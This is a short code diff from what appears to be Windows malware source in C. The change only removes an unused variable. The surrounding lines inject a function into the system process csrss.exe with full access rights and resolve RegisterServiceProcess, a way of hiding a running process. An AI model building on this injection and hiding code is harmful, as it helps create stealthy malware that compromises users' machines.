@@ -36,7 +36,7 @@ int main() {
 	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);
 
 	HINSTANCE hKernel;
-	int i = 1;
+
 	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
 	if (hKernel) {
 		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
